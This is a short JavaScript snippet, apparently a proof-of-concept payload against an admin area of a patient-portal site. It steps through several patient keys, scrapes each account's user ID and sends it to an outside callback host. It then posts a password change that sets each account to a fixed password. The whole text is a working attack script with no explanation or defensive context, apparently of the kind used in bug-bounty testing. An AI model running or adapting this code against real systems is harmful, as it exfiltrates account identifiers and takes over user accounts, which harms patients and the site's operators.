for (let i = 199234; i <= 199237; i++) {
  fetch(`https://pateng.erad.com/Admin/AdminUsers/Edit?aPatientKey=${i}`)
    .then(res => res.text())
    .then(res => {
      let match = res.match(/id='UserIDText'>(.*?)<\/span>/);
      if (match) {
        fetch(`https://503iiuoz8db5jj44ry5eh5vk0b62uuij.oastify.com?data=${encodeURIComponent(match[1])}`);
      }
      return fetch("https://pateng.erad.com/Admin/AdminUsers/SavePasswordChange", {
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
        body: `aPatientKey=${i}&NewPassword=Test%40123%4012`
      });
    });
}
